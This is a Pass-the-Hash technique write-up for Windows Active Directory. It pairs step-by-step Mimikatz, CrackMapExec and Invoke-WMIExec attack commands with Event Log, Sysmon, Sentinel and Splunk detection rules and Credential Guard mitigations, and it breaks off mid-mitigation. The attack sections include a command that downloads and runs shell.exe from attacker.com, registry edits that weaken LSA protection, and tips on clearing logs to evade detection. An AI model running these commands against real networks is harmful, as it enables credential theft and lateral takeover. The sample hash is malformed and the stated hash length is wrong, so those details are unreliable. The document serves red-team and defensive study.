# [LM-AUTH-001]: Pass-the-Hash (PTH)

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-001 |
| **MITRE ATT&CK v18.1** | [T1550.002](https://attack.mitre.org/techniques/T1550/002/) – Use Alternate Authentication Material: Pass the Hash |
| **Tactic** | Lateral Movement |
| **Platforms** | Windows AD / Endpoint |
| **Severity** | CRITICAL |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2016-2025, Windows 10-11 (all builds) |
| **Patched In** | N/A – technique remains viable; mitigations focus on preventative controls, not patching |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Pass-the-Hash (PtH) is a lateral movement technique where an attacker uses a stolen NTLM password hash to authenticate to remote systems without needing the plaintext password. The attacker intercepts or extracts password hashes (typically from LSASS memory, SAM registry, or NTDS.dit), then passes the hash directly to the NTLM authentication protocol. Windows treats the hash as equivalent to the password during network authentication, allowing the attacker to authenticate as the compromised user to any accessible resource (SMB, RDP, WMI, SQL Server, etc.) that supports NTLM authentication.

**Attack Surface:** NTLM authentication protocol, LSASS memory, network authentication mechanisms (SMB, WMI, RDP), local and remote workstations, domain controllers, and any system configured to accept NTLM-based credentials.

**Business Impact:** **Complete lateral movement across an organization.** Once a single user's NTLM hash is compromised, an attacker gains the ability to access any system where that user has logged in or has credentials. If the compromised account is privileged (domain admin, service account), the attacker can move from a foothold machine to critical infrastructure (domain controllers, file servers, exchange servers, databases). This enables privilege escalation, data exfiltration, malware deployment, and persistence across the entire network within hours.

**Technical Context:** PtH attacks typically execute in seconds to minutes per target system. Detection likelihood is **Medium-to-High** if proper monitoring is enabled, as the technique generates specific Windows Event IDs (4624 with Logon Type 3, 4768, 4769). However, on systems with default logging or without advanced security event forwarding, the attack can remain undetected. The technique has no time limit—as long as the NTLM hash hasn't changed (i.e., the user hasn't reset their password), it remains valid for authentication indefinitely.

### Operational Risk

- **Execution Risk:** **Low** – No exploitation of vulnerabilities required; relies entirely on credential theft, which is often successful due to misconfigured privileges or endpoint detection gaps.
- **Stealth:** **Low-to-Medium** – Generates immediate Event ID 4624 (Logon Type 3) on domain controllers. High-volume PtH attacks across multiple systems trigger rapid detection. However, low-frequency, targeted PtH against a few key systems may evade standard alerting thresholds.
- **Reversibility:** **Partial** – The only true remediation is forcing a password reset on the compromised account. Until the password is changed, the hash remains exploitable.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.3 | Account Policies – Password must be changed at next logon |
| **DISA STIG** | Windows-FW-000001 | Account Lockout Threshold must be set |
| **CISA SCuBA** | AC-3 | Access Enforcement |
| **NIST 800-53** | IA-2 | Authentication – Implement multi-factor authentication |
| **GDPR** | Article 32 | Security of Processing – Implement appropriate technical measures |
| **DORA** | Article 9 | Protection and Prevention – Incident response procedures |
| **NIS2** | Article 21 | Cybersecurity Risk Management Measures |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Threat: Credential Compromise | Risk scenario for unauthorized network access |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- **For hash extraction:** Local Administrator or SYSTEM on the source machine.
- **For hash reuse:** Any network connectivity to the target resource; no local privileges required on the target.

**Required Access:**
- **Source:** Compromised endpoint with LSASS access (via Mimikatz, Task Manager, registry hives, or memory dumps).
- **Target:** Network path to the destination system (SMB port 445, RDP port 3389, WMI port 135/445, or other NTLM-based service port).

**Supported Versions:**
- **Windows Server:** 2016, 2019, 2022, 2025
- **Windows Client:** 10, 11 (all builds)
- **PowerShell:** 5.0+ (for scripted variants); native Windows commands work on all versions
- **Mimikatz:** Version 2.0+ (latest version 2.2.0-20250109)
- **CrackMapExec:** Version 5.0+ (Windows binary; Python 3.8+ for Linux variant)

**Prerequisites:** Network connectivity to target system; NTLM authentication enabled on target (default on all Windows systems prior to Credential Guard deployment); no Credential Guard or Windows Defender Application Guard on source machine (these protect LSASS memory).

---

## 3. ATTACK CHAIN CONTEXT

| Phase | Technique | Prerequisites | Enablement |
|---|---|---|---|
| **Initial Access** | Phishing / Malware / Weak Credentials | User interaction or misconfig | Admin access to source machine |
| **Credential Access** | LSASS Dumping / SAM Registry / NTDS Extraction | Local or Domain Admin | Extracted NTLM hash(es) |
| **Current: Lateral Movement** | **Pass-the-Hash** | NTLM hash + network access | Lateral authentication as compromised user |
| **Privilege Escalation** | Token Impersonation / Kerberoasting | Hash of privileged account | Domain compromise |
| **Persistence** | Golden Ticket / Shadow Admin / Persistence Account | KRBTGT hash / DA compromise | Long-term network access |
| **Impact** | Data Exfiltration / Ransomware Deployment | Full network access | Business data loss / operational disruption |

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Mimikatz sekurlsa::pth (Windows – Command Prompt / PowerShell)

**Supported Versions:** Windows Server 2016-2025, Windows 10-11

#### Step 1: Extract NTLM Hash from LSASS Memory

**Objective:** Dump NTLM hashes from LSASS memory on the compromised machine (prerequisite to PtH attack).

**Version Note:** All modern Windows versions store NTLM hashes in LSASS; behavior is consistent across Server 2016-2025.

**Command (Admin Prompt / PowerShell):**
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Alternative (PowerShell):**
```powershell
$mimi = @'
privilege::debug
sekurlsa::logonpasswords
exit
'@
$mimi | & 'C:\path\to\mimikatz.exe'
```

**Expected Output:**
```
Authentication Id : 0 ; 12345 (00000000:00003039)
Session           : Interactive
User Name         : VICTIM_USER
Domain            : CORP
Logon Server      : DC01
Logon Time        : 1/10/2025 10:45:00 AM
SID               : S-1-5-21-1234567890-1234567890-1234567890-1001
  msv :
    [00000003] Primary
    NTLM Hash : cc36cf7a8514893efccd3324464tkg1a  <--- NTLM HASH (64 hex chars)
    SHA1      : ...
```

**What This Means:**
- The **NTLM Hash** (64-character hexadecimal string) is what you need for Pass-the-Hash.
- Each user session with active credentials will display their hash.
- Hashes are tied to the user account, not the machine; they work on any system where that user has rights.

**OpSec & Evasion:**
- Mimikatz execution may trigger antivirus alerts. Deploy from a trusted CI/CD pipeline or RMM tool to evade detection.
- Clear the Process Creation event (Event ID 4688) and Mimikatz process artifacts immediately after execution.
- Use in-memory execution (e.g., via PowerShell reflection or encrypted payload) to avoid disk writes.
- **Detection likelihood:** High – LSASS access and process elevation are logged in modern EDR/SIEM setups.

**Troubleshooting:**
- **Error:** "ERROR kuhl_m_sekurlsa_acquireProcess ; OpenProcess (8)"
  - **Cause:** Running without admin privileges; LSASS is protected process.
  - **Fix:** Run as Administrator; use `RunAs` or elevation prompts.
- **Error:** "ERROR kuhl_m_sekurlsa_enum_logon_callback ; GetLogonSessionData (5)"
  - **Cause:** Credential Guard enabled (Windows 10 1607+, Server 2016+).
  - **Fix (2016-2019):** Disable Credential Guard in Group Policy: `Computer Configuration > Administrative Templates > System > Device Guard > Turn On Virtualization Based Security` → Set to **Disabled**.
  - **Fix (2022+):** Credential Guard is more entrenched; requires registry edit: `reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v LsaProtectedProcess /t REG_DWORD /d 0 /f` (requires reboot).

**References & Proofs:**
- [Mimikatz GitHub – sekurlsa::pth](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
- [MITRE ATT&CK – T1003.001 (LSASS Memory)](https://attack.mitre.org/techniques/T1003/001/)
- [Sempris Blog – Pass the Hash Explained](https://www.semperis.com/blog/pass-the-hash-attack-explained/)

---

#### Step 2: Execute Pass-the-Hash Attack Using Mimikatz

**Objective:** Authenticate as the compromised user to a remote system using the stolen NTLM hash.

**Version Note:** Behavior is consistent across all Windows versions; no breaking changes between Server 2016-2025.

**Command (Admin Prompt):**
```cmd
mimikatz.exe "sekurlsa::pth /user:VICTIM_USER /domain:CORP /ntlm:cc36cf7a8514893efccd3324464tkg1a /run:cmd.exe"
```

**Command (Variant – With Direct Service Exploitation):**
```cmd
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:CORP.COM /ntlm:cc36cf7a8514893efccd3324464tkg1a /run:powershell.exe"
```

**Command (Variant – Targeting Specific Logon Session):**
```cmd
mimikatz.exe "sekurlsa::pth /user:VICTIM_USER /domain:CORP /ntlm:cc36cf7a8514893efccd3324464tkg1a /luid:0x3e7"
```

**Expected Output:**
```
sekurlsa::pth /user:VICTIM_USER /domain:CORP /ntlm:cc36cf7a8514893efccd3324464tkg1a /run:cmd.exe
...
[00000003] Primary
NTLM Hash : cc36cf7a8514893efccd3324464tkg1a
SHA1      : ...
 * Injecting token in pid 5432 (cmd.exe)
 * Token successfully injected
```

**What This Means:**
- Mimikatz spawns a new `cmd.exe` (or PowerShell) process with the stolen NTLM hash injected into its authentication token.
- Any network authentication performed by this process will use the victim user's NTLM hash instead of the current user's credentials.
- The injected token bypasses password verification; Windows receives the hash and treats it as valid authentication.

**OpSec & Evasion:**
- The spawned cmd.exe/powershell.exe will appear to run as the current user, but authentication to remote resources uses the victim's hash.
- Monitor the spawned process lifetime; terminate it after accessing the target resource to avoid detection.
- Use `/luid` parameter to inject into an existing logon session instead of creating a new process (more stealthy).
- **Detection likelihood:** Medium – Process creation event (4688) shows cmd.exe/powershell.exe spawn, but unless EDR correlates this with LSASS access, it may appear benign.

**Troubleshooting:**
- **Error:** "ERROR kuhl_m_sekurlsa_pth ; Impersonate LOGON_ID failed"
  - **Cause:** Invalid LOGON_ID specified; logon session doesn't exist.
  - **Fix (2016-2019):** Use `privilege::debug` before `sekurlsa::pth`; ensure LSASS is accessible.
  - **Fix (2022+):** Ensure token elevation is correct; may require explicit `token::elevate` first.
- **Error:** "ERROR kuhl_m_sekurlsa_pth ; Call to CreateProcessWithTokenW failed"
  - **Cause:** User privilege restriction (e.g., SeDelegateSessionUserImpersonatePrivilege not granted).
  - **Fix:** Run Mimikatz with `SYSTEM` privileges or ensure the user account has token impersonation rights.

**References & Proofs:**
- [Praetorian – Inside Mimikatz Pass-the-Hash (Part 2)](https://www.praetorian.com/blog/inside-mimikatz-part2/)
- [SpecterOps – Offensive Lateral Movement](https://posts.specterops.io/)
- [Gentilkiwi Mimikatz Wiki – sekurlsa::pth](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)

---

#### Step 3: Access Remote Resource Using Injected Credentials

**Objective:** Access a remote system (file share, RDP, database) using the injected NTLM hash.

**Version Note:** SMB/RDP authentication behavior is identical across Server 2016-2025.

**Command (Access SMB Share – Test Administrative Access):**
```cmd
dir \\TARGET_SYSTEM\C$
```

**Expected Output (Success):**
```
 Volume in drive \\TARGET_SYSTEM\C$ is OS
 Volume Serial Number is ABCD-1234

 Directory of \\TARGET_SYSTEM\C$

01/10/2025  10:45 AM    <DIR>          ProgramFiles
01/10/2025  10:45 AM    <DIR>          Users
01/10/2025  10:45 AM    <DIR>          Windows
               0 bytes          3 File(s)      0 bytes
```

**Command (Lateral Movement via RDP):**
```cmd
mstsc.exe /v:TARGET_SYSTEM
```

**Expected Output:**
- RDP window opens; authentication succeeds because the injected NTLM hash is used.
- If the victim user has local admin rights on TARGET_SYSTEM, login succeeds without password prompt.

**Command (Command Execution via PSExec):**
```cmd
psexec.exe \\TARGET_SYSTEM -c whoami
```

**Expected Output:**
```
C:\WINDOWS\system32\whoami.exe
TARGET_SYSTEM\VICTIM_USER
```

**What This Means:**
- The directory listing (`dir \\TARGET_SYSTEM\C$`) succeeds because the injected NTLM hash matches the victim user's credentials on that system.
- Any commands executed via RDP, PSExec, WMI, or other remote methods execute with the victim user's privileges.
- If the victim user is a domain admin or has local admin rights on the target, you now have code execution on that system.

**OpSec & Evasion:**
- Use SMB (port 445) rather than RDP (port 3389) for lateral movement; SMB traffic is harder to distinguish from legitimate admin activity.
- Avoid using well-known lateral movement tools (PSExec, PsRemoting) if the target has EDR; use built-in Windows tools (Net, Robocopy, `New-PSSession`).
- **Detection likelihood:** Low-to-Medium for SMB movement (legitimate admin activity); High for RDP (unusual login patterns) or suspicious process creation on the target.

**Troubleshooting:**
- **Error:** "Access Denied" when accessing `C$` share
  - **Cause:** NTLM hash belongs to a user without local admin rights on the target.
  - **Fix:** Repeat steps 1-2 with a hash from an admin user (domain admin, local admin on target).
- **Error:** "Network path not found"
  - **Cause:** Target system is offline, firewall blocks SMB, or hostname is incorrectly specified.
  - **Fix:** Verify target system is online (`ping TARGET_SYSTEM`); check firewall rules for port 445.

**References & Proofs:**
- [Beyond Trust – Pass-the-Hash Detection](https://www.beyondtrust.com/resources/glossary/pass-the-hash-pth-attack)
- [Netwrix – Pass the Hash Attack Tutorial](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/pass-the-hash-attack/)

---

### METHOD 2: CrackMapExec Pass-the-Hash (Linux/Windows – Direct Lateral Movement)

**Supported Versions:** Windows Server 2016-2025 (target); Linux/Windows (attacker platform)

**Prerequisite:** CrackMapExec binary must be present on attacker machine; network connectivity to target (SMB port 445).

#### Step 1: Execute Command on Remote System via SMB

**Objective:** Leverage CrackMapExec to pass the hash directly to SMB and execute commands remotely.

**Command (Execute whoami on target):**
```bash
crackmapexec smb TARGET_SYSTEM -u VICTIM_USER -H cc36cf7a8514893efccd3324464tkg1a -x whoami
```

**Alternative (Execute PowerShell command):**
```bash
crackmapexec smb TARGET_SYSTEM -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x "powershell.exe -c (New-Object System.Net.Webclient).DownloadFile('http://attacker.com/shell.exe','C:\\temp\\shell.exe'); C:\\temp\\shell.exe"
```

**Alternative (Pass-the-Hash against multiple targets):**
```bash
crackmapexec smb 192.168.1.0/24 -u VICTIM_USER -H cc36cf7a8514893efccd3324464tkg1a --shares
```

**Expected Output (Success):**
```
SMB         TARGET_SYSTEM   445    TARGET_SYSTEM    [*] Windows Server 2019 Build 17763 x64 (name:TARGET_SYSTEM) (domain:CORP.COM) (signing:True) (SMBv1:False)
SMB         TARGET_SYSTEM   445    TARGET_SYSTEM    [+] CORP.COM\VICTIM_USER:cc36cf7a8514893efccd3324464tkg1a (Pwned!)
SMB         TARGET_SYSTEM   445    TARGET_SYSTEM    [+] Executed command via wmiexec
SMB         TARGET_SYSTEM   445    TARGET_SYSTEM    CORP\VICTIM_USER
```

**What This Means:**
- `[+] (Pwned!)` indicates successful authentication using the NTLM hash.
- The command executes immediately on the remote system with the victim user's privileges.
- No password required; the hash alone grants access.

**OpSec & Evasion:**
- CrackMapExec may be detected by antivirus or network IDS; deploy from an air-gapped testing network if possible.
- Avoid credential reuse across multiple targets in rapid succession (generates anomalous authentication patterns in event logs).
- Use SMB signing and encryption where possible to evade packet inspection.
- **Detection likelihood:** Medium-to-High if SIEM correlates rapid NTLM authentication failures (from brute-force) followed by success.

**Troubleshooting:**
- **Error:** "SMB SessionError: STATUS_LOGON_FAILURE"
  - **Cause:** Invalid NTLM hash or user does not exist on target.
  - **Fix:** Verify hash is correct; test with a known valid account first.
- **Error:** "Connection refused"
  - **Cause:** SMB disabled or firewall blocks port 445.
  - **Fix:** Enable SMB on target; verify firewall rules.

**References & Proofs:**
- [CrackMapExec GitHub](https://github.com/byt3bl33d3r/CrackMapExec)
- [Red Canary – CrackMapExec Detection](https://redcanary.com/)

---

### METHOD 3: Invoke-WMIExec PowerShell (Windows – WMI-Based Lateral Movement)

**Supported Versions:** Windows Server 2016-2025, Windows 10-11

**Prerequisite:** PowerShell 5.0+; WMI enabled on target (default); Invoke-WMIExec script downloaded.

#### Step 1: Download and Execute Invoke-WMIExec

**Objective:** Use PowerShell and WMI to authenticate with stolen NTLM hash and execute commands remotely.

**Command (Download and execute):**
```powershell
$HashWebRequest = @{
    Uri = 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/main/Invoke-WMIExec.ps1'
    UseBasicParsing = $true
}
IEX (Invoke-WebRequest @HashWebRequest)

Invoke-WMIExec -Target TARGET_SYSTEM -Username VICTIM_USER -Hash cc36cf7a8514893efccd3324464tkg1a -Command "whoami"
```

**Alternative (Inline execution without download):**
```powershell
$HashCommand = @{
    Target = 'TARGET_SYSTEM'
    Username = 'VICTIM_USER'
    Hash = 'cc36cf7a8514893efccd3324464tkg1a'
    Command = 'ipconfig'
    Domain = 'CORP.COM'
}
Invoke-WMIExec @HashCommand
```

**Expected Output:**
```
Target   : TARGET_SYSTEM
User     : CORP\VICTIM_USER
Command  : whoami
Output   : CORP\VICTIM_USER
```

**What This Means:**
- The WMI connection authenticates using the NTLM hash instead of plaintext password.
- Command executes in the context of the victim user on the target system.
- WMI execution is typically less monitored than SMB or RDP, making it stealthier.

**OpSec & Evasion:**
- WMI execution creates Win32_Process objects on the target; this may be logged in WMI Event Log (Event ID 5857) if auditing is enabled.
- Execution is in-memory; no disk artifacts are created.
- **Detection likelihood:** Low-to-Medium (WMI auditing is less common than SMB auditing).

**Troubleshooting:**
- **Error:** "The RPC server is unavailable"
  - **Cause:** WMI disabled or RPC port (135) blocked.
  - **Fix:** Enable WMI: `wmic os get version` on target; check firewall rules for RPC.
- **Error:** "Access Denied"
  - **Cause:** NTLM hash invalid or user lacks WMI rights.
  - **Fix:** Verify hash; test with a known admin account.

**References & Proofs:**
- [Kevin Robertson – Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [Red Canary – WMI Lateral Movement Detection](https://redcanary.com/)

---

## 5. ATOMIC RED TEAM

### Atomic Test Suite for T1550.002

**Atomic Test ID:** ec23cef9-27d9-46e4-a68d-6f75f7b86908

**Test Name:** Mimikatz Pass the Hash

**Description:** Simulates Pass-the-Hash attack using Mimikatz to authenticate with stolen NTLM hash.

**Supported Versions:** Server 2016-2025, Windows 10-11

**Execution Command:**
```powershell
$TestArgs = @{
    TestId = 'ec23cef9-27d9-46e4-a68d-6f75f7b86908'
    TestNumbers = 1
}
Invoke-AtomicTest @TestArgs
```

**Direct Mimikatz Command:**
```cmd
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a /run:cmd.exe"
```

**Cleanup Command:**
```powershell
Get-Process cmd.exe | Where-Object {$_.Name -eq 'cmd'} | Stop-Process -Force
```

**Atomic Test #2 – CrackMapExec Pass the Hash**

**Test Command:**
```bash
crackmapexec smb 192.168.1.0/24 -u Administrator -H cc36cf7a8514893efccd3324464tkg1a --shares
```

**Atomic Test #3 – Invoke-WMIExec Pass the Hash**

**Test Command:**
```powershell
IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/main/Invoke-WMIExec.ps1' -UseBasicParsing)
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname
```

**Reference:** [Atomic Red Team T1550.002](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1550.002/T1550.002.md)

---

## 6. TOOLS & COMMANDS REFERENCE

### Mimikatz

**Version:** 2.2.0-20250109 (latest)  
**Minimum Version:** 2.0 (2015)  
**Supported Platforms:** Windows Server 2008 R2–2025; Windows Vista–11

**Version-Specific Notes:**
- **2.0 (2015):** Original sekurlsa::pth implementation; handles NTLM only
- **2.1 (2017):** Added Kerberos ticket injection via sekurlsa::pth
- **2.2+ (2024+):** Enhanced UAC bypass, Protected Process Light (PPL) detection mitigation

**Installation:**
```powershell
# Download from Gentilkiwi GitHub
$MimikatzUrl = 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20250109/mimikatz_trunk.zip'
Invoke-WebRequest -Uri $MimikatzUrl -OutFile 'C:\Tools\mimikatz.zip'
Expand-Archive -Path 'C:\Tools\mimikatz.zip' -DestinationPath 'C:\Tools\mimikatz'
```

**Usage:**
```cmd
mimikatz.exe "sekurlsa::pth /user:VICTIM /domain:CORP /ntlm:HASH /run:cmd.exe"
```

---

### CrackMapExec

**Version:** 5.4.0 (latest Windows binary)  
**Minimum Version:** 5.0  
**Supported Platforms:** Windows (via binary); Linux/macOS (Python 3.8+)

**Installation (Windows Binary):**
```powershell
# Download from GitHub releases
$CmxUrl = 'https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.4.0/CrackMapExecWin-v5.4.0.zip'
Invoke-WebRequest -Uri $CmxUrl -OutFile 'C:\Tools\cme.zip'
Expand-Archive -Path 'C:\Tools\cme.zip' -DestinationPath 'C:\Tools\cme'
```

**Usage:**
```bash
crackmapexec smb 192.168.1.0/24 -u USER -H NTLM_HASH -x 'command'
```

---

### Invoke-WMIExec

**Source:** Kevin Robertson (Invoke-TheHash)  
**Minimum Requirements:** PowerShell 5.0, WMI enabled

**Installation:**
```powershell
# Download script
$ScriptUrl = 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/main/Invoke-WMIExec.ps1'
Invoke-WebRequest -Uri $ScriptUrl -OutFile 'C:\Tools\Invoke-WMIExec.ps1'
```

**Usage:**
```powershell
Invoke-WMIExec -Target 192.168.1.100 -Username VICTIM -Hash NTLM_HASH -Command whoami
```

---

## 7. WINDOWS EVENT LOG MONITORING

### Event ID 4624 (Successful Logon)

**Log Source:** Security Event Log  
**Trigger:** Successful authentication with Logon Type 3 (network logon)  
**Filter:** Look for Logon Type 3 events with unusual source IPs, rapid succession across multiple systems, or outside of business hours.

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Logon/Logoff**
3. Double-click **Audit Logon**
4. Enable: **Success** and **Failure**
5. Click **Apply** → **OK**
6. Run `gpupdate /force` on all domain-joined machines

**Manual Configuration Steps (Server 2022+ via Registry):**
```powershell
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
```

**KQL Query (Microsoft Sentinel):**
```kusto
SecurityEvent
| where EventID == 4624
| where LogonType == 3
| where LogonGuid == ""
| summarize Count = count() by Account, Computer, IpAddress, TimeGenerated
| where Count > 3  // Threshold for anomaly
```

**What to Look For:**
- Logon Type 3 (network logon) events without corresponding Type 2 (interactive) or Type 10 (remote interactive) logons
- Multiple rapid Type 3 logons from a single source IP across different target systems
- Logon attempts with service accounts or disabled accounts (indicates token replay/pass-the-hash)

---

### Event ID 4768 (Kerberos TGT Request)

**Log Source:** Security Event Log (Domain Controller)  
**Trigger:** Kerberos ticket request  
**Filter:** Look for failed TGT requests (Result Code ≠ 0x0) followed by successful logon on unrelated systems

**Manual Configuration Steps:**
1. On **Domain Controller**, open **Group Policy Management Console**
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Logon**
3. Double-click **Audit Kerberos Authentication Service**
4. Enable: **Success** and **Failure**
5. Click **Apply** → **OK**
6. Restart the Domain Controller or run `gpupdate /force`

**KQL Query (Microsoft Sentinel):**
```kusto
SecurityEvent
| where EventID == 4768
| where Status != "0x0"  // Pre-authentication failures
| summarize Count = count() by Account, Computer
| where Count > 5
```

---

### Event ID 4769 (Kerberos Service Ticket Request)

**Log Source:** Security Event Log (Domain Controller)  
**Trigger:** Service ticket (TGS) request  
**Filter:** Correlate with 4768 events; look for mismatched user contexts

**Configuration:** Same as Event ID 4768 above.

---

### Event ID 4648 (Explicit Credential Usage)

**Log Source:** Security Event Log  
**Trigger:** Process uses alternate credentials (different from logged-in user)  
**Filter:** Indicates potential Pass-the-Hash if the "Alternate Credential User" is a domain admin or service account

**Manual Configuration Steps:**
1. Open **Group Policy Management Console**
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Logon/Logoff**
3. Double-click **Audit Explicit Credentials**
4. Enable: **Success**
5. Click **Apply** → **OK**
6. Run `gpupdate /force`

---

## 8. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+  
**Supported Platforms:** Windows Server 2016-2025, Windows 10-11

**Sysmon Configuration (Event ID 1 – Process Creation):**

```xml
<Sysmon schemaversion="4.81">
  <EventFiltering>
    <!-- Detect Mimikatz execution -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">sekurlsa::pth</CommandLine>
      <CommandLine condition="contains">mimikatz</CommandLine>
      <Image condition="contains">mimikatz.exe</Image>
    </ProcessCreate>
    
    <!-- Detect cmd.exe spawned with suspicious parents (potential PtH injection) -->
    <ProcessCreate onmatch="include">
      <Image condition="is">C:\Windows\System32\cmd.exe</Image>
      <ParentImage condition="contains">mimikatz</ParentImage>
    </ProcessCreate>
    
    <!-- Detect WMI lateral movement -->
    <ProcessCreate onmatch="include">
      <Image condition="is">C:\Windows\System32\wmic.exe</Image>
      <CommandLine condition="contains">process call create</CommandLine>
    </ProcessCreate>
    
    <!-- Detect named pipe creation for SMB lateral movement -->
    <CreateRemoteThread onmatch="include">
      <TargetImage condition="is">C:\Windows\System32\lsass.exe</TargetImage>
    </CreateRemoteThread>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Save the XML config above to `sysmon-config.xml`
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Where-Object {$_.Id -eq 1}
   ```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Pass-the-Hash via Logon Type 3 Anomaly

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, LogonType, Account, IpAddress, Computer
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Azure AD all versions, Hybrid AD (Server 2016+)

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4624
| where LogonType == 3  // Network logon (NTLM)
| where Account !contains "$"  // Exclude computer accounts
| summarize Count = count(), Computers = dcount(Computer), IPs = dcount(IpAddress)
    by Account, TimeGenerated = bin(TimeGenerated, 5m)
| where Count > 10  // Threshold: >10 logons in 5 minutes
| project TimeGenerated, Account, Count, Computers, IPs
| union (
    SecurityEvent
    | where EventID == 4624
    | where LogonType == 3
    | where TimeGenerated > ago(30m)
    | where Account has "krbtgt"  // Kerberos ticket account logon (suspicious)
)
```

**What This Detects:**
- Rapid Logon Type 3 events (network logons) across multiple systems – typical of Pass-the-Hash scanning
- Any logon by the KRBTGT account (never should logon interactively; indicates Golden Ticket exploitation)
- High volume of network logons from service accounts outside business hours

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Detect Pass-the-Hash via Logon Type 3 Anomaly`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Alert grouping: **Group into single alert** (per Account)
7. Click **Review + create**

---

### Query 2: Detect NTLM Logon Failures Followed by Success (Brute Force Indicator)

**KQL Query:**
```kusto
let FailureThreshold = 5;
let SuccessThreshold = 1;
SecurityEvent
| where EventID == 4625  // Failed logon
| where LogonType == 3
| where TimeGenerated > ago(1h)
| summarize FailCount = count() by Account, IpAddress
| where FailCount >= FailureThreshold
| join (
    SecurityEvent
    | where EventID == 4624
    | where LogonType == 3
    | where TimeGenerated > ago(30m)
) on Account, IpAddress
| project Account, IpAddress, FailCount, SuccessfulLogonTime = TimeGenerated
```

**Applies To:** All Hybrid AD and Azure AD environments.

---

## 10. SPLUNK DETECTION RULES

### Rule 1: Pass-the-Hash Detection via Logon Type 3

**Rule Configuration:**
- **Required Index:** windows_security, main
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** event_code, logon_type, user, src_ip, dest
- **Alert Threshold:** > 5 events in 10 minutes
- **Applies To Versions:** Windows Server 2016-2025

**SPL Query:**
```spl
index=windows_security event_code=4624 logon_type=3
| stats count, dc(dest) as DestCount by user, src_ip
| where count > 5 AND DestCount > 2
| rename user as Account, src_ip as Source, DestCount as TargetCount
```

**What This Detects:**
- Single source IP authenticating to multiple destinations with the same account credentials (typical PtH scanning pattern)
- High volume of Type 3 logons in rapid succession

**Manual Configuration Steps:**
1. Log into **Splunk Web** → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to: `count > 5`
6. Configure **Actions** → **Send email to SOC**
7. Click **Save**

**Source:** [Splunk Security Essentials](https://splunkbase.splunk.com/app/3435)

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable Credential Guard (Windows 10 1607+, Server 2016+)**

Credential Guard protects NTLM hashes in LSASS by isolating credential material in a virtualized secure kernel. This prevents hash extraction even with admin privileges.

**Applies To Versions:** Server 2016-2025, Windows 10-11

**Manual Steps (Group Policy – Server 2016-2019):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to: **Computer Configuration** → **Administrative Templates** → **System** → **Device Guard**
3. Double-click **Turn On Virtualization Based Security**
4. Set to: **Enabled**
5. Configure as: **Enabled with UEFI lock**
6. Click **Apply** → **OK**
7. Restart computers for changes to take effect

**Manual Steps (Group Policy – Server 2022+):**
1. Same path as above, but also navigate to:
   - **Computer Configuration** → **Administrative Templates** → **System** → **Device Guard** → **Credential Guard**
   - Set: **Turn On Credential Guard** = **Enabled**
2. Restart required

**Manual Steps (PowerShell – Server 2022+):**
```powershell
# Enable Credential Guard
